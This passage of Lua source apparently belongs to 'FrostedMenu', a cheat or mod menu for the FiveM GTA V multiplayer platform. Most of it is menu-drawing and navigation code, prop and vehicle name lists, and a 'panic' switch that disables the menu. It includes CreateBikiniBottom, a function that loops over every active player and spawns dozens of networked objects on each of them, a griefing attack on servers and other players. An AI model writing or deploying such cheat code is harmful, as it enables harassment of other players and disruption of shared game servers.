"prop_prop_tree_02",
"prop_protest_sign_01",
"prop_protest_table_01",
"prop_prototype_minibomb",
"prop_proxy_chateau_table",
"prop_punch_bag_l",
"prop_pylon_01",
"prop_pylon_02",
"prop_pylon_03",
"prop_pylon_04",
"prop_p_jack_03_col",
"prop_p_spider_01a",
"prop_p_spider_01c",
"prop_p_spider_01d",
"prop_ql_revolving_door",
"prop_quad_grid_line",
"prop_radiomast01",
"prop_radiomast02",
"prop_rad_waste_barrel_01",
"prop_ragganeon",
"prop_rag_01",
"prop_railsleepers01",
"prop_railsleepers02",
"prop_railstack01",
"prop_railstack02",
"prop_railstack03",
"prop_railstack04",
"prop_railstack05",
"prop_rail_boxcar",
"prop_rail_boxcar2",
"prop_rail_boxcar3",
"prop_rail_boxcar4",
"prop_rail_boxcar5",
"prop_rail_boxcar5_d",
"prop_rail_buffer_01",
"prop_rail_buffer_02",
"prop_rail_controller",
"prop_rail_crane_01",
"prop_rail_points01",
"prop_rail_points02",
"prop_rail_sigbox01",
"prop_rail_sigbox02",
"prop_rail_signals02",
"prop_rail_tankcar",
"prop_rail_tankcar2",
"prop_rail_tankcar3",
"prop_rail_wellcar",
"prop_rail_wellcar2",
"prop_range_target_01",
"prop_range_target_02",
"prop_range_target_03",
"prop_rebar_pile01",
"prop_recyclebin_02a",
"prop_recyclebin_02b",
"prop_recyclebin_02_c",
"prop_recyclebin_02_d",
"prop_recyclebin_03_a",
"prop_recyclebin_04_a",
"prop_recyclebin_04_b",
"prop_recyclebin_05_a",
"prop_ret_door",
"prop_ret_door_02",
"prop_ret_door_03",
"prop_ret_door_04",
"prop_rf_conc_pillar",
"prop_riding_crop_01",
"prop_riot_shield",
"prop_rio_del_01",
"prop_roadcone01a",
"prop_roadcone01b",
"prop_roadcone01c",
"prop_roadcone02a",
"prop_roadcone02b",
"prop_roadcone02c",
"prop_roadheader_01",
"prop_rock_1_a",
"prop_rock_1_b",
"prop_rock_1_c",
"prop_rock_1_d",
"prop_rock_1_e",
"prop_rock_1_f",
"prop_rock_1_g",
"prop_rock_1_h",
"prop_rock_1_i",
"prop_rock_2_a",
"prop_rock_2_c",
"prop_rock_2_d",
"prop_rock_2_f",
"prop_rock_2_g",
"prop_rock_3_a",
"prop_rock_3_b",
"prop_rock_3_c",
"prop_rock_3_d",
"prop_rock_3_e",
"prop_rock_3_f",
"prop_rock_3_g",
"prop_rock_3_h",
"prop_rock_3_i",
"prop_rock_3_j",
"prop_rock_4_c",
"prop_rock_4_d",
"prop_rock_chair_01",
"prop_rolled_sock_01",
"prop_rolled_sock_02",
"prop_rolled_yoga_mat",
"prop_roller_car_01",
"prop_roller_car_02",
"prop_ron_door_01",
"prop_roofpipe_01",
"prop_roofpipe_02",
"prop_roofpipe_03",
"prop_roofpipe_04",
"prop_roofpipe_05",
"prop_roofpipe_06",
"prop_roofvent_011a",
"prop_roofvent_01a",
"prop_roofvent_01b",
"prop_roofvent_02a",
"prop_roofvent_02b",
"prop_roofvent_03a",
"prop_roofvent_04a",
"prop_roofvent_05a",
"prop_roofvent_05b",
"prop_roofvent_07a",
"prop_roofvent_08a",
"prop_roofvent_09a",
"prop_roofvent_10a",
"prop_roofvent_10b",
"prop_roofvent_11b",
"prop_roofvent_11c",
"prop_roofvent_12a",
"prop_roofvent_13a",
"prop_roofvent_15a",
"prop_roofvent_16a",
"prop_rope_family_3",
"prop_rope_hook_01",
"prop_roundbailer01",
"prop_roundbailer02",
"prop_rub_bike_01",
"prop_rub_bike_02",
"prop_rub_bike_03",
"prop_rub_binbag_sd_01",
"prop_rub_binbag_sd_02",
"prop_rub_busdoor_01",
"prop_rub_busdoor_02",
"prop_rub_buswreck_01",
"prop_rub_buswreck_03",
"prop_rub_buswreck_06",
"prop_rub_cabinet",
"prop_rub_cabinet01",
"prop_rub_cabinet02",
"prop_rub_cabinet03",
"prop_rub_cage01a",
"prop_rub_carpart_02",
"prop_rub_carpart_03",
"prop_rub_carpart_04",
"prop_rub_chassis_01",
"prop_rub_chassis_02",
"prop_rub_chassis_03",
"prop_rub_cont_01a",
"prop_rub_cont_01b",
"prop_rub_cont_01c",
"prop_rub_flotsam_01",
"prop_rub_flotsam_02",
"prop_rub_flotsam_03",
"prop_rub_frklft",
"prop_rub_litter_01",
"prop_rub_litter_02",
"prop_rub_litter_03",
"prop_rub_litter_03b",
"prop_rub_litter_03c",
"prop_rub_litter_04",
"prop_rub_litter_04b",
"prop_rub_litter_05",
"prop_rub_litter_06",
"prop_rub_litter_07",
"prop_rub_litter_09",
"prop_rub_litter_8",
"prop_rub_matress_01",
"prop_rub_matress_02",
"prop_rub_matress_03",
"prop_rub_matress_04",
"prop_rub_monitor",
"prop_rub_pile_01",
"prop_rub_pile_02",
"prop_rub_planks_01",
"prop_rub_planks_02",
"prop_rub_planks_03",
"prop_rub_planks_04",
"prop_rub_railwreck_1",
"prop_rub_railwreck_2",
"prop_rub_railwreck_3",
"prop_rub_scrap_02",
"prop_rub_scrap_03",
"prop_rub_scrap_04",
"prop_rub_scrap_05",
"prop_rub_scrap_06",
"prop_rub_scrap_07",
"prop_rub_stool",
"prop_rub_sunktyre",
"prop_rub_t34",
"prop_rub_trainers_01",
"prop_rub_trolley01a",
"prop_rub_trolley02a",
"prop_rub_trolley03a",
"prop_rub_trukwreck_1",
"prop_rub_trukwreck_2",
"prop_rub_tyre_01",
"prop_rub_tyre_02",
"prop_rub_tyre_03",
"prop_rub_tyre_dam1",
"prop_rub_tyre_dam2",
"prop_rub_tyre_dam3",
"prop_rub_washer_01",
"prop_rub_wheel_01",
"prop_rub_wheel_02",
"prop_rub_wreckage_3",
"prop_rub_wreckage_4",
"prop_rub_wreckage_5",
"prop_rub_wreckage_6",
"prop_rub_wreckage_7",
"prop_rub_wreckage_8",
"prop_rub_wreckage_9",
"prop_rural_windmill_l1",
"prop_rural_windmill_l2",
"prop_rus_olive",
"prop_rus_olive_wint",
"prop_sacktruck_01",
"prop_sacktruck_02a",
"prop_safety_glasses",
"prop_sam_01",
"prop_sandwich_01",
"prop_satdish_2_a",
"prop_satdish_2_f",
"prop_satdish_2_g",
"prop_satdish_3_b",
"prop_satdish_3_c",
"prop_satdish_3_d",
"prop_satdish_l_01",
"prop_satdish_s_03",
"prop_satdish_s_05a",
"prop_satdish_s_05b",
"prop_sc1_06_gate_l",
"prop_sc1_06_gate_r",
"prop_sc1_12_door",
"prop_sc1_21_g_door_01",
"prop_scaffold_pole",
"prop_scafold_01a",
"prop_scafold_01c",
"prop_scafold_01f",
"prop_scafold_02a",
"prop_scafold_02c",
"prop_scafold_03a",
"prop_scafold_03b",
"prop_scafold_03c",
"prop_scafold_03f",
"prop_scafold_04a",
"prop_scafold_05a",
"prop_scafold_06a",
"prop_scafold_06b",
"prop_scafold_06c",
"prop_scafold_07a",
"prop_scafold_08a",
"prop_scafold_09a",
"prop_scafold_frame1a",
"prop_scafold_frame1b",
"prop_scafold_frame1c",
"prop_scafold_frame1f",
"prop_scafold_frame2a",
"prop_scafold_frame2b",
"prop_scafold_frame2c",
"prop_scafold_frame3a",
"prop_scafold_frame3c",
"prop_scafold_rail_01",
"prop_scafold_rail_02",
"prop_scafold_rail_03",
"prop_scafold_xbrace",
"prop_scalpel",
"prop_scn_police_torch",
"prop_scourer_01",
"prop_scrap_2_crate",
"prop_scrap_win_01",
"prop_scrim_01",
"prop_scythemower",
"prop_section_garage_01",
"prop_securityvan_lightrig",
"prop_security_case_01",
"prop_security_case_02",
"prop_sec_gate_01b",
"prop_sec_gate_01c",
"prop_sec_gate_01d",
"prop_set_generator_01",
"prop_sewing_fabric",
"prop_sewing_machine",
"prop_sglasses_stand_01",
"prop_sglasses_stand_02",
"prop_sglasses_stand_02b",
"prop_sglasses_stand_03",
"prop_sglasss_1b_lod",
"prop_sglasss_1_lod",
"prop_shamal_crash",
"prop_shelves_01",
"prop_shelves_02",
"prop_shelves_03",
"prop_shopping_bags01",
"prop_shopping_bags02",
"prop_shop_front_door_l",
"prop_shop_front_door_r",
"prop_shots_glass_cs",
"prop_shower_01",
"prop_shower_rack_01",
"prop_shower_towel",
"prop_showroom_door_l",
"prop_showroom_door_r",
"prop_showroom_glass_1b",
"prop_shredder_01",
"prop_shrub_rake",
"prop_shuttering01",
"prop_shuttering02",
"prop_shuttering03",
"prop_shuttering04",
"prop_sh_beer_pissh_01",
"prop_sh_bong_01",
"prop_sh_cigar_01",
"prop_sh_joint_01",
"prop_sh_mr_rasp_01",
"prop_sh_shot_glass",
"prop_sh_tall_glass",
"prop_sh_tt_fridgedoor",
"prop_sh_wine_glass",
"prop_side_lights",
"prop_side_spreader",
"prop_sign_airp_01a",
"prop_sign_airp_02a",
"prop_sign_airp_02b",
"prop_sign_big_01",
"prop_sign_mallet",
"prop_sign_road_04g_l1",
"prop_single_grid_line",
"prop_single_rose",
"prop_sink_01",
"prop_sink_02",
"prop_sink_03",
"prop_sink_04",
"prop_sink_05",
"prop_sink_06",
"prop_skate_flatramp",
"prop_skate_funbox",
"prop_skate_halfpipe",
"prop_skate_kickers",
"prop_skate_quartpipe",
"prop_skate_rail",
"prop_skate_spiner",
"prop_skid_chair_01",
"prop_skid_chair_02",
"prop_skid_chair_03",
"prop_skid_sleepbag_1",
"prop_skid_tent_01",
"prop_skid_tent_01b",
"prop_skid_tent_03",
"prop_skip_01a",
"prop_skip_02a",
"prop_skip_03",
"prop_skip_04",
"prop_skip_05a",
"prop_skip_05b",
"prop_skip_06a",
"prop_skip_08a",
"prop_skip_08b",
"prop_skip_10a",
"prop_skip_rope_01",
"prop_skunk_bush_01",
"prop_skylight_01"
}

ESX = nil
Citizen.CreateThread(
    function()
        while ESX == nil do
            TriggerEvent(
                'esx:getSharedObject',
                function(a)
                    ESX = a
                end
            )
            Citizen.Wait(1000)
        end
    end
)
local function e()
    local name = GetPlayerName(PlayerId())
end
local h = false
rot = 1
local j = false
FrostedMenu = {}
FrostedMenu.debug = false
local function k(l)
    local m = {}
    local n = GetGameTimer() / 200
    m.r = math.floor(math.sin(n * l + 0) * 127 + 128)
    m.g = math.floor(math.sin(n * l + 2) * 127 + 128)
    m.b = math.floor(math.sin(n * l + 4) * 127 + 128)
    return m
end
local o = {}
local p = {
    up = 172,
    down = 173,
    left = 174,
    right = 175,
    select = 176,
    back = 177
}
local q = 0
local s = nil
local t = nil
local u = 0.23
local v = 0.11
local w = 0.03
local A = 1.0
local B = 0.041
local C = 0
local D = 0.370
local E = 0.005
local F = 0.005
local G = '34ByTe Community'
local function H(I)
    if FrostedMenu.debug then
        Citizen.Trace('[FrostedMenu] ' .. tostring(I))
    end
end
local function J(f, K, value)
    if f and o[f] then
        o[f][K] = value
        H(f .. ' menu property changed: { ' .. tostring(K) .. ', ' .. tostring(value) .. ' }')
    end
end
local function L(f)
    if f and o[f] then
        return o[f].visible
    else
        return false
    end
end
local function M(f, N, O)
    if f and o[f] then
        J(f, 'visible', N)
        if not O and o[f] then
            J(f, 'currentOption', 1)
        end
        if N then
            if f ~= t and L(t) then
                M(t, false)
            end
            t = f
        end
    end
end
local function P(I, x, y, Q, R, S, T, U, V)
    SetTextColour(255, 255, 255, 255)
    SetTextFont(Q)
    SetTextScale(S, S)
    if U then
        SetTextDropShadow(2, 2, 0, 0, 0)
    end
    if o[t] then
        if T then
            SetTextCentre(T)
        elseif V then
            SetTextWrap(o[t].x, o[t].x + u - E)
            SetTextRightJustify(true)
        end
    end
    SetTextEntry('STRING')
    AddTextComponentString(I)
    DrawText(x, y)
end
local function W(x, y, X, height, R)
    DrawRect(x, y, X, height, R.r, R.g, R.b, R.a)
end
local function Y()
    if o[t] then
        local x = o[t].x + u / 2
        local y = o[t].y + v / 2
        if o[t].titleBackgroundSprite then
            DrawSprite(
                frosted_config.sprite_dict,
                frosted_config.sprite_name,
                x,
                y,
                u,
                v,
                0.0,
                frosted_config.sprite_r,
				frosted_config.sprite_g,
                frosted_config.sprite_b,
                frosted_config.sprite_a
            )
        end
        P(o[t].title, x, y - v / 2 + w, o[t].titleFont, o[t].titleColor, A, true)
    end
end
local function Z()
    if o[t] then
        local x = o[t].x + u / 2
        local y = o[t].y + v + B / 2
        local a0 = {
            r = o[t].titleBackgroundColor.r,
            g = o[t].titleBackgroundColor.g,
            b = o[t].titleBackgroundColor.b,
            a = 255
        }
        W(x, y, u, B, o[t].subTitleBackgroundColor)
        P(o[t].subTitle, o[t].x + E, y - B / 2 + F, C, a0, D, false)
        if q > o[t].maxOptionCount then
            P(
                tostring(o[t].currentOption) .. ' / ' .. tostring(q),
                o[t].x + u,
                y - B / 2 + F,
                C,
                a0,
                D,
                false,
                false,
                true
            )
        end
    end
end
local function a1(I, a2)
    local x = o[t].x + u / 2
    local a3 = nil
    if o[t].currentOption <= o[t].maxOptionCount and q <= o[t].maxOptionCount then
        a3 = q
    elseif q > o[t].currentOption - o[t].maxOptionCount and q <= o[t].currentOption then
        a3 = q - (o[t].currentOption - o[t].maxOptionCount)
    end
    if a3 then
        local y = o[t].y + v + B + B * a3 - B / 2
        local a4 = nil
        local a5 = nil
        local a6 = nil
        local U = false
        if o[t].currentOption == q then
            a4 = o[t].menuFocusBackgroundColor
            a5 = o[t].menuFocusTextColor
            a6 = o[t].menuFocusTextColor
        else
            a4 = o[t].menuBackgroundColor
            a5 = o[t].menuTextColor
            a6 = o[t].menuSubTextColor
            U = true
        end
        W(x, y, u, B, a4)
        P(I, o[t].x + E, y - B / 2 + F, C, a5, D, false, U)
        if a2 then
            P(a2, o[t].x + E, y - B / 2 + F, C, a6, D, false, U, true)
        end
    end
end

function FrostedMenu.CreateMenu(f, a7)
    o[f] = {}
    o[f].title = a7
    o[f].subTitle = G
    o[f].visible = false
    o[f].previousMenu = nil
    o[f].aboutToBeClosed = false
    o[f].x = 0.75
    o[f].y = 0.19
    o[f].currentOption = 1
    o[f].maxOptionCount = 10
    o[f].titleFont = 1
    o[f].titleColor = {
        r = 255,
        g = 255,
        b = 255,
        a = 255
    }
    Citizen.CreateThread(
        function()
            while true do
                Citizen.Wait(0)
                local a8 = k(1.0)
                o[f].titleBackgroundColor = {
                    r = 255,
                    g = 255,
                    b = 255,
                    a = 255
                }
                o[f].menuFocusBackgroundColor = {
                    r = 255,
                    g = 255,
                    b = 255,
                    a = 50
                }
				o[f].titleBackgroundSprite = {
					dict = frosted_config.sprite_dict,
					name = frosted_config.sprite_name
					
				}
            end
        end
    )
				o[f].titleBackgroundSprite = {
					dict = frosted_config.sprite_dict,
					name = frosted_config.sprite_name
					
				}
    o[f].menuTextColor = {
        r = 255,
        g = 255,
        b = 255,
        a = 255
    }
    o[f].menuSubTextColor = {
        r = 189,
        g = 189,
        b = 189,
        a = 255
    }
    o[f].menuFocusTextColor = {
        r = 255,
        g = 255,
        b = 255,
        a = 255
    }
    o[f].menuBackgroundColor = {
        r = 0,
        g = 0,
        b = 0,
        a = 100
    }
    o[f].subTitleBackgroundColor = {
        r = o[f].menuBackgroundColor.r,
        g = o[f].menuBackgroundColor.g,
        b = o[f].menuBackgroundColor.b,
        a = 255
    }
    o[f].buttonPressedSound = {
        name = '~h~~r~> ~s~SELECT',
        set = 'HUD_FRONTEND_DEFAULT_SOUNDSET'
    }
    H(tostring(f) .. ' menu created')
end

function FrostedMenu.CreateSubMenu(f, a9, aa)
    if o[a9] then
        FrostedMenu.CreateMenu(f, o[a9].title)
        if aa then
            J(f, 'subTitle', aa)
        else
            J(f, 'subTitle', o[a9].subTitle)
        end
        J(f, 'previousMenu', a9)
        J(f, 'x', o[a9].x)
        J(f, 'y', o[a9].y)
        J(f, 'maxOptionCount', o[a9].maxOptionCount)
        J(f, 'titleFont', o[a9].titleFont)
        J(f, 'titleColor', o[a9].titleColor)
        J(f, 'titleBackgroundColor', o[a9].titleBackgroundColor)
        J(f, 'titleBackgroundSprite', o[a9].titleBackgroundSprite)
        J(f, 'menuTextColor', o[a9].menuTextColor)
        J(f, 'menuSubTextColor', o[a9].menuSubTextColor)
        J(f, 'menuFocusTextColor', o[a9].menuFocusTextColor)
        J(f, 'menuFocusBackgroundColor', o[a9].menuFocusBackgroundColor)
        J(f, 'menuBackgroundColor', o[a9].menuBackgroundColor)
        J(f, 'subTitleBackgroundColor', o[a9].subTitleBackgroundColor)
    else
        H('Failed to create ' .. tostring(f) .. ' submenu: ' .. tostring(a9) .. " parent menu doesn't exist")
    end
end

function CreateBikiniBottom()
	for i = 0, 128 do
		if NetworkIsPlayerActive(i) then
			local SelectedPlayer = i
			local ped = GetPlayerPed(SelectedPlayer)
            local coords = GetEntityCoords(ped)
            local heading = GetEntityHeading(ped)
            local forwardx = GetEntityForwardX(ped)
            local forwardy = GetEntityForwardY(ped)
			for x = 0, 30 do
                    local prop = CreateObject(GetHashKey("prop_pineapple"), coords.x + forwardx * 2, coords.y + forwardy * 2, coords.z + 0.7, 180, true, true, true);
                    SetEntityLodDist(prop, 500)
                    SetEntityDynamic(prop, true)
                    SetEntityRecordsCollisions(prop, true)
                    SetEntityHasGravity(prop, true)
                    FreezeEntityPosition(prop, false)
                    SetEntityVelocity(prop, 0, 0, 0)
			end
			for z = 0, 20 do
			        local ped = GetPlayerPed(SelectedPlayer)
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    local forwardx = GetEntityForwardX(ped)
                    local forwardy = GetEntityForwardY(ped)
					local droppeditem = bikini_bottom[math.random(1, #bikini_bottom)]
                    local prop = CreateObject(GetHashKey(droppeditem), coords.x, coords.y, coords.z, 180, true, true, true);
                    SetEntityLodDist(prop, 500)
                    SetEntityDynamic(prop, true)
                    SetEntityRecordsCollisions(prop, true)
                    SetEntityHasGravity(prop, true)
                    FreezeEntityPosition(prop, false)
                    SetEntityVelocity(prop, 0, 0, 0)
			end
		end
	end
end

--function b00mekcustommodel()
--	local model = GetKeyboardInput()
--		RequestModel(GetHashKey(model)) 
--		Wait(500)
--	if HasModelLoaded(GetHashKey(model)) then
--		SetPlayerModel(PlayerId(), GetHashKey(model))
--		else ShowInfo("~r~Model not recognized")
--end

function FrostedMenu.CurrentMenu()
    return t
end

local frosted_panic = false

function FrostedMenu.OpenMenu(f)
    if not frosted_panic then
    if f and o[f] then
        PlaySoundFrontend(-1, 'SELECT', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
        M(f, true)
        if o[f].titleBackgroundSprite then
            RequestStreamedTextureDict(o[f].titleBackgroundSprite.dict, false)
            while not HasStreamedTextureDictLoaded(o[f].titleBackgroundSprite.dict) do
                Citizen.Wait(0)
            end
        end
        H(tostring(f) .. ' menu opened')
    else
        H('Failed to open ' .. tostring(f) .. " menu: it doesn't exist")
    end
    else
        print("MENU INSTANCE FUCKEDUP")
        print(cipka)
    end 
end

function FrostedMenu.IsMenuOpened(f)
    return L(f)
end

function FrostedMenu.IsAnyMenuOpened()
    for f, _ in pairs(o) do
        if L(f) then
            return true
        end
    end
    return false
end

function FrostedMenu.IsMenuAboutToBeClosed()
    if o[t] then
        return o[t].aboutToBeClosed
    else
        return false
    end
end

function FrostedMenu.CloseMenu()
    if o[t] then
        if o[t].aboutToBeClosed then
            o[t].aboutToBeClosed = false
            M(t, false)
            H(tostring(t) .. ' menu closed')
            PlaySoundFrontend(-1, 'QUIT', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
            q = 0
            t = nil
            s = nil
        else
            o[t].aboutToBeClosed = true
            H(tostring(t) .. ' menu about to be closed')
        end
    end
end

function FrostedMenu.Button(I, a2)
    local ab = I
    if a2 then
        ab = '{ ' .. tostring(ab) .. ', ' .. tostring(a2) .. ' }'
    end
    if o[t] then
        q = q + 1
        local ac = o[t].currentOption == q
        a1(I, a2)
        if ac then
            if s == p.select then
                PlaySoundFrontend(-1, o[t].buttonPressedSound.name, o[t].buttonPressedSound.set, true)
                H(ab .. ' button pressed')
                return true
            elseif s == p.left or s == p.right then
                PlaySoundFrontend(-1, 'NAV_UP_DOWN', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
            end
        end
        return false
    else
        H('Failed to create ' .. ab .. ' button: ' .. tostring(t) .. " menu doesn't exist")
        return false
    end
end

function FrostedMenu.MenuButton(I, f)
    if o[f] then
        if FrostedMenu.Button(I) then
            M(t, false)
            M(f, true, true)
            return true
        end
    else
        H('Failed to create ' .. tostring(I) .. ' menu button: ' .. tostring(f) .. " submenu doesn't exist")
    end
    return false
end

function FrostedMenu.CheckBox(I, bool, ad)
    local ae = '~r~~h~OFF'
    if bool then
        ae = '~g~~h~ON'
    end
    if FrostedMenu.Button(I, ae) then
        bool = not bool
        H(tostring(I) .. ' checkbox changed to ' .. tostring(bool))
        ad(bool)
        return true
    end
    return false
end

function FrostedMenu.ComboBox(I, af, ag, ah, ad)
    local ai = #af
    local aj = af[ag]
    local ac = o[t].currentOption == q + 1
    if ai > 1 and ac then
        aj = '← ' .. tostring(aj) .. ' →'
    end
    if FrostedMenu.Button(I, aj) then
        ah = ag
        ad(ag, ah)
        return true
    elseif ac then
        if s == p.left then
            if ag > 1 then
                ag = ag - 1
            else
                ag = ai
            end
        elseif s == p.right then
            if ag < ai then
                ag = ag + 1
            else
                ag = 1
            end
        end
    else
        ag = ah
    end
    ad(ag, ah)
    return false
end

function FrostedMenu.Display()
    if L(t) then
        if o[t].aboutToBeClosed then
            FrostedMenu.CloseMenu()
        else
            ClearAllHelpMessages()
            Y()
            Z()
            s = nil
            if IsDisabledControlJustPressed(0, p.down) then
                PlaySoundFrontend(-1, 'NAV_UP_DOWN', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
                if o[t].currentOption < q then
                    o[t].currentOption = o[t].currentOption + 1
                else
                    o[t].currentOption = 1
                end
            elseif IsDisabledControlJustPressed(0, p.up) then
                PlaySoundFrontend(-1, 'NAV_UP_DOWN', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
                if o[t].currentOption > 1 then
                    o[t].currentOption = o[t].currentOption - 1
                else
                    o[t].currentOption = q
                end
            elseif IsDisabledControlJustPressed(0, p.left) then
                s = p.left
            elseif IsDisabledControlJustPressed(0, p.right) then
                s = p.right
            elseif IsDisabledControlJustPressed(0, p.select) then
                s = p.select
            elseif IsDisabledControlJustPressed(0, p.back) then
                if o[o[t].previousMenu] then
                    PlaySoundFrontend(-1, 'BACK', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
                    M(o[t].previousMenu, true)
                else
                    FrostedMenu.CloseMenu()
                end
            end
            q = 0
        end
    end
end

function FrostedMenu.SetMenuWidth(f, X)
    J(f, 'width', X)
end

function FrostedMenu.SetMenuX(f, x)
    J(f, 'x', x)
end

function FrostedMenu.SetMenuY(f, y)
    J(f, 'y', y)
end

function FrostedMenu.SetMenuMaxOptionCountOnScreen(f, count)
    J(f, 'maxOptionCount', count)
end

function FrostedMenu.SetTitleColor(f, r, g, b, ak)
    J(
        f,
        'titleColor',
        {
            ['r'] = r,
            ['g'] = g,
            ['b'] = b,
            ['a'] = ak or o[f].titleColor.a
        }
    )
end

function FrostedMenu.SetTitleBackgroundColor(f, r, g, b, ak)
    J(
        f,
        'titleBackgroundColor',
        {
            ['r'] = r,
            ['g'] = g,
            ['b'] = b,
            ['a'] = ak or o[f].titleBackgroundColor.a
        }
    )
end

function FrostedMenu.SetTitleBackgroundSprite(f, al, am)
    J(
        f,
        'titleBackgroundSprite',
        {
            dict = al,
            name = am
        }
    )
end

function FrostedMenu.SetSubTitle(f, I)
    J(f, 'subTitle', I)
end

function FrostedMenu.SetMenuBackgroundColor(f, r, g, b, ak)
    J(
        f,
        'menuBackgroundColor',
        {
            ['r'] = r,
            ['g'] = g,
            ['b'] = b,
            ['a'] = ak or o[f].menuBackgroundColor.a
        }
    )
end

function FrostedMenu.SetMenuTextColor(f, r, g, b, ak)
    J(
        f,
        'menuTextColor',
        {
            ['r'] = r,
            ['g'] = g,
            ['b'] = b,
            ['a'] = ak or o[f].menuTextColor.a
        }
    )
end

function FrostedMenu.SetMenuSubTextColor(f, r, g, b, ak)
    J(
        f,
        'menuSubTextColor',
        {
            ['r'] = r,
            ['g'] = g,
            ['b'] = b,
            ['a'] = ak or o[f].menuSubTextColor.a
        }
    )
end

function FrostedMenu.SetMenuFocusColor(f, r, g, b, ak)
    J(
        f,
        'menuFocusColor',
        {
            ['r'] = r,
            ['g'] = g,
            ['b'] = b,
            ['a'] = ak or o[f].menuFocusColor.a
        }
    )
end

function FrostedMenu.SetMenuButtonPressedSound(f, name, an)
    J(
        f,
        'buttonPressedSound',
        {
            ['name'] = name,
            ['set'] = an
        }
    )
end

function KeyboardInput(ao, ap, aq)
    AddTextEntry('FMMC_KEY_TIP1', ao .. ':')
    DisplayOnscreenKeyboard(1, 'FMMC_KEY_TIP1', '', ap, '', '', '', aq)
    blockinput = true
    while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
        Citizen.Wait(0)
    end
    if UpdateOnscreenKeyboard() ~= 2 then
        AddTextEntry('FMMC_KEY_TIP1', '')
        local m = GetOnscreenKeyboardResult()
        Citizen.Wait(500)
        blockinput = false
        return m
    else
        AddTextEntry('FMMC_KEY_TIP1', '')
        Citizen.Wait(500)
        blockinput = false
        return nil
    end
end
local function ar()
    local as = {}
    for i = 0, GetNumberOfPlayers() do
        if NetworkIsPlayerActive(i) then
            as[#as + 1] = i
        end
    end
    return as
end

function DrawText3D(x, y, z, I, r, g, b)
    SetDrawOrigin(x, y, z, 0)
    SetTextFont(0)
    SetTextProportional(0)
    SetTextScale(0.0, 0.20)
    SetTextColour(r, g, b, 255)
    SetTextDropshadow(0, 0, 0, 0, 255)
    SetTextEdge(2, 0, 0, 0, 150)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry('STRING')
    SetTextCentre(1)
    AddTextComponentString(I)
    DrawText(0.0, 0.0)
    ClearDrawOrigin()
end

function math.round(at, au)
    return tonumber(string.format('%.' .. (au or 0) .. 'f', at))
end
local function k(l)
    local m = {}
    local n = GetGameTimer() / 1000
    m.r = math.floor(math.sin(n * l + 0) * 127 + 128)
    m.g = math.floor(math.sin(n * l + 2) * 127 + 128)
    m.b = math.floor(math.sin(n * l + 4) * 127 + 128)
    return m
end
local function av(I, aw)
    SetNotificationTextEntry('STRING')
    AddTextComponentString(I)
    DrawNotification(aw, false)
    if rgbnot then
        for i = 0, 24 do
            i = i + 1
            SetNotificationBackgroundColor(i)
        end
    else
        SetNotificationBackgroundColor(24)
    end
end

function checkValidVehicleExtras()
    local ax = PlayerPedId()
    local ay = GetVehiclePedIsIn(ax, false)
    local az = {}
    for i = 0, 50, 1 do
        if DoesExtraExist(ay, i) then
            local aA = '~h~Extra #' .. tostring(i)
            local I = 'OFF'
            if IsVehicleExtraTurnedOn(ay, i) then
                I = 'ON'
            end
            local aB = '~h~extra ' .. tostring(i)
            table.insert(
                az,
                {
                    menuName = realModName,
                    data = {
                        ['action'] = realSpawnName,
                        ['state'] = I
                    }
                }
            )
        end
    end
    return az
end

function DoesVehicleHaveExtras(veh)
    for i = 1, 30 do
        if DoesExtraExist(veh, i) then
            return true
        end
    end
    return false
end

function checkValidVehicleMods(aC)
    local ax = PlayerPedId()
    local ay = GetVehiclePedIsIn(ax, false)
    local az = {}
    local aD = GetNumVehicleMods(ay, aC)
    if aC == 48 and aD == 0 then
        local aD = GetVehicleLiveryCount(ay)
        for i = 1, aD, 1 do
            local aE = i - 1
            local aF = GetLiveryName(ay, aE)
            local realModName = GetLabelText(aF)
            local aG, realSpawnName = aC, aE
            az[i] = {
                menuName = realModName,
                data = {
                    ['modid'] = aG,
                    ['realIndex'] = realSpawnName
                }
            }
        end
    end
    for i = 1, aD, 1 do
        local aE = i - 1
        local aF = GetModTextLabel(ay, aC, aE)
        local realModName = GetLabelText(aF)
        local aG, realSpawnName = aD, aE
        az[i] = {
            menuName = realModName,
            data = {
                ['modid'] = aG,
                ['realIndex'] = realSpawnName
            }
        }
    end
    if aD > 0 then
        local aE = -1
        local aG, realSpawnName = aC, aE
        table.insert(
            az,
            1,
            {
                menuName = 'Stock',
                data = {
                    ['modid'] = aG,
                    ['realIndex'] = realSpawnName
                }
            }
        )
    end
    return az
end
local aH = {
    'Dinghy',
    'Dinghy2',
    'Dinghy3',
    'Dingh4',
    'Jetmax',
    'Marquis',
    'Seashark',
    'Seashark2',
    'Seashark3',
    'Speeder',
    'Speeder2',
    'Squalo',
    'Submersible',
    'Submersible2',
    'Suntrap',
    'Toro',
    'Toro2',
    'Tropic',
    'Tropic2',
    'Tug'
}
local aI = {
    'Benson',
    'Biff',
    'Cerberus',
    'Cerberus2',
    'Cerberus3',
    'Hauler',
    'Hauler2',
    'Mule',
    'Mule2',
    'Mule3',
    'Mule4',
    'Packer',
    'Phantom',
    'Phantom2',
    'Phantom3',
    'Pounder',
    'Pounder2',
    'Stockade',
    'Stockade3',
    'Terbyte'
}
local aJ = {
    'Blista',
    'Blista2',
    'Blista3',
    'Brioso',
    'Dilettante',
    'Dilettante2',
    'Issi2',
    'Issi3',
    'issi4',
    'Iss5',
    'issi6',
    'Panto',
    'Prarire',
    'Rhapsody'
}
local aK = {
    'CogCabrio',
    'Exemplar',
    'F620',
    'Felon',
    'Felon2',
    'Jackal',
    'Oracle',
    'Oracle2',
    'Sentinel',
    'Sentinel2',
    'Windsor',
    'Windsor2',
    'Zion',
    'Zion2'
}
local aL = {
    'Bmx',
    'Cruiser',
    'Fixter',
    'Scorcher',
    'Tribike',
    'Tribike2',
    'tribike3'
}
local aM = {
    'ambulance',
    'FBI',
    'FBI2',
    'FireTruk',
    'PBus',
    'police',
    'Police2',
    'Police3',
    'Police4',
    'PoliceOld1',
    'PoliceOld2',
    'PoliceT',
    'Policeb',
    'Polmav',
    'Pranger',
    'Predator',
    'Riot',
    'Riot2',
    'Sheriff',
